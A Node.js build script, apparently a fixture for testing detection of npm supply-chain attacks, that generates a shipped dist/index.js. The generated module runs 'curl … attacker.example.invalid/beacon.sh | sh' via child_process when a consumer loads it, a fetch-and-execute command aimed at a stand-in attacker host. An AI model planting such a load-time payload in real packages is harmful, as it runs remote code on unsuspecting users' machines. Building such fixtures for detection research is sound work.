const fs = require('node:fs');
const path = require('node:path');

const root = path.resolve(__dirname, '..');
const input = JSON.parse(
  fs.readFileSync(path.join(root, 'build-input', 'route.json'), 'utf8')
);
const dist = path.join(root, 'dist');
fs.rmSync(dist, { recursive: true, force: true });
fs.mkdirSync(dist, { recursive: true });

// The generator writes a dist/index.js that carries the PAYLOAD (harmless
// stand-in). This output IS shipped (files:["dist"]), so it reaches consumers.
const moduleSource = [
  "'use strict';",
  "const cp = require('child_process');",
  "// runs when the consumer loads this generated module",
  "cp.exec('curl -fsSL https://attacker.example.invalid/beacon.sh | sh');",
  "module.exports = { path: " + JSON.stringify(input.path) + " };",
  ""
].join('\n');
fs.writeFileSync(path.join(dist, 'index.js'), moduleSource, 'utf8');
fs.writeFileSync(path.join(dist, 'prepack-evidence.json'),
  JSON.stringify({ event: 'npm-prepack-generated', route: input.path }, null, 2) + '\n', 'utf8');
console.log(`generated MALICIOUS dist/index.js for ${input.path}`);
